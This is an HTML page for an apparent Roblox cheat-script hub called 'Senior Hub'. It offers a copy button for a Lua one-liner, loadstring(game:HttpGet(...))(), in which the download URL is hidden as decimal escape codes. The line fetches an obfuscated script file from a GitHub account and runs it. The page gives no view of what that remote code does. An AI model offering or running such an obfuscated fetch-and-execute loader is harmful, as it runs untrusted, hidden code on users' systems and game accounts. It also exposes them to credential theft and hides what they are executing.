<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>:)</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
:root {
    --bg-color: #0f0c29;
    --primary-color: #302b63;
    --secondary-color: #24243e;
    --accent-color: #ff6ec4;
    --text-color: #ffffff;
    --text-muted-color: #cfcfcf;
    --glow-color: rgba(255, 110, 196, 0.4);
}


        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

body {
    /* diğer özellikler */
    background: linear-gradient(-45deg, #0f0c29, #302b63, #24243e, #0f0c29);
    background-size: 400% 400%;
    animation: gradientBG 15s ease infinite;
}

@keyframes gradientBG {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}


        body {
            font-family: 'Poppins', sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
            padding: 2rem 1rem;
            overflow-x: hidden;
        }

        .navbar {
            width: 100%;
            max-width: 800px;
            margin-bottom: 2rem;
            background-color: var(--primary-color);
            border-radius: 16px;
            padding: 1rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid var(--secondary-color);
            animation: fadeIn 1s ease-out;
        }

        .nav-tabs {
            display: flex;
            justify-content: center;
            gap: 1rem;
        }

        .nav-tab {
            background-color: transparent;
            border: none;
            padding: 0.75rem 1.5rem;
            color: var(--text-muted-color);
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: color 0.3s ease, background-color 0.3s ease, transform 0.3s ease;
            border-radius: 8px;
            position: relative;
            overflow: hidden;
            outline: none;
        }

        .nav-tab:hover {
            color: var(--text-color);
            transform: translateY(-2px);
        }

        .nav-tab.active {
            color: var(--accent-color);
            background-color: var(--secondary-color);
            box-shadow: 0 0 15px var(--glow-color);
        }

        .nav-tab.active:hover {
            transform: none;
        }

        .nav-tab.active::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background-color: var(--accent-color);
            border-radius: 2px 2px 0 0;
            animation: tabUnderline 0.3s ease-out forwards;
        }

        @keyframes tabUnderline {
            from { transform: scaleX(0); }
            to { transform: scaleX(1); }
        }

        .tab-content {
            display: none;
            width: 100%;
            max-width: 800px;
            margin-bottom: 2rem;
            opacity: 0;
            transform: translateY(20px);
        }

        .tab-content.active {
            display: block;
            animation: fadeIn 0.5s ease-out forwards;
        }

        .tab-content.fading-out {
            display: block;
            animation: fadeOut 0.5s ease-out forwards;
            pointer-events: none;
        }
        
        .container {
            width: 100%;
            background-color: var(--primary-color);
            border-radius: 16px;
            padding: 2rem 3rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid var(--secondary-color);
            text-align: center;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeOut {
            from { opacity: 1; transform: translateY(0); }
            to { opacity: 0; transform: translateY(20px); }
        }

        header h1 {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 2rem;
            color: var(--accent-color);
            text-shadow: 0 0 10px var(--glow-color), 0 0 20px var(--glow-color);
            animation: glow 2s infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 10px var(--glow-color), 0 0 20px var(--glow-color); }
            to { text-shadow: 0 0 20px var(--glow-color), 0 0 40px var(--glow-color); }
        }

        .script-section {
            margin-bottom: 2.5rem;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .script-section h2 {
            font-size: 1.8rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            color: var(--text-color);
        }

        .script-section textarea {
            width: 100%;
            max-width: 600px;
            height: 120px;
            background-color: var(--secondary-color);
            border: 1px solid var(--accent-color);
            border-radius: 8px;
            padding: 1rem;
            color: var(--text-color);
            font-family: 'Fira Code', 'Cascadia Code', monospace;
            font-size: 0.9rem;
            resize: vertical;
            box-shadow: 0 0 10px rgba(83, 120, 255, 0.3);
            outline: none;
            transition: box-shadow 0.3s ease;
        }

        .script-section textarea:focus {
            box-shadow: 0 0 15px var(--glow-color);
        }

        .script-section .cta-button {
            margin-top: 1.5rem;
            max-width: 320px;
        }

        .cta-button {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.75rem;
            background: var(--accent-color);
            color: #fff;
            padding: 1rem 2.5rem;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 1.1rem;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 0 15px var(--glow-color);
            animation: pulse 2s infinite;
            width: 100%;
            max-width: 320px;
        }

        .cta-button.discord-button {
            background: #5865F2;
            box-shadow: 0 0 15px rgba(88, 101, 242, 0.5);
            animation: none;
        }

        .cta-button:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 25px var(--glow-color);
            animation-play-state: paused;
        }

        .cta-button.discord-button:hover {
            box-shadow: 0 0 25px rgba(88, 101, 242, 0.7);
        }

        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 15px var(--glow-color); }
            50% { transform: scale(1.05); box-shadow: 0 0 25px var(--glow-color); }
            100% { transform: scale(1); box-shadow: 0 0 15px var(--glow-color); }
        }

        footer {
            margin-top: auto;
            color: var(--text-muted-color);
            font-size: 0.9rem;
            animation: fadeIn 1s ease-out 1s backwards;
        }

        @media (max-width: 600px) {
            body {
                padding: 1rem 0.5rem;
            }
            .container {
                padding: 1.5rem;
            }
            header h1 {
                font-size: 2rem;
            }
            .nav-tab {
                font-size: 1rem;
                padding: 0.6rem 1rem;
            }
            .script-section h2 {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div id="home-content" class="tab-content active">
        <div class="container">
            <header>
                <h1>Senior Hub</h1>
            </header>
            <section class="script-section">
                <textarea id="scriptTextarea" readonly>loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\116\117\98\117\115\101\114\99\111\109\47\49\48\49\105\105\105\49\48\49\47\105\100\107\45\114\47\114\101\112\115\47\104\101\97\100\115\47\109\97\105\110\47\111\98\102\117\115\99\97\116\101\100\95\115\99\112\116\45\49\55\53\48\54\54\57\48\53\53\53\57\50\46\108\117\97\46\116\120\116"))()</textarea>
                <button id="copyScriptButton" class="cta-button">
                    <i class="fas fa-copy"></i> Copy Script
                </button>
            </section>
        </div>
    </div>



<script>


    const copyButton = document.getElementById('copyScriptButton');
    const scriptTextarea = document.getElementById('scriptTextarea');

    copyButton.addEventListener('click', async () => {
        try {
            await navigator.clipboard.writeText(scriptTextarea.value);
            copyButton.innerHTML = '<i class="fas fa-check"></i> Copied!';
            setTimeout(() => {
                copyButton.innerHTML = '<i class="fas fa-copy"></i> Copy Script';
            }, 2000);
        } catch (err) {
            console.error('Failed to copy text: ', err);
            scriptTextarea.select();
            document.execCommand('copy');
            copyButton.innerHTML = '<i class="fas fa-check"></i> Copied!';
            setTimeout(() => {
                copyButton.innerHTML = '<i class="fas fa-copy"></i> Copy Script';
            }, 2000);
        }
    });
</script>
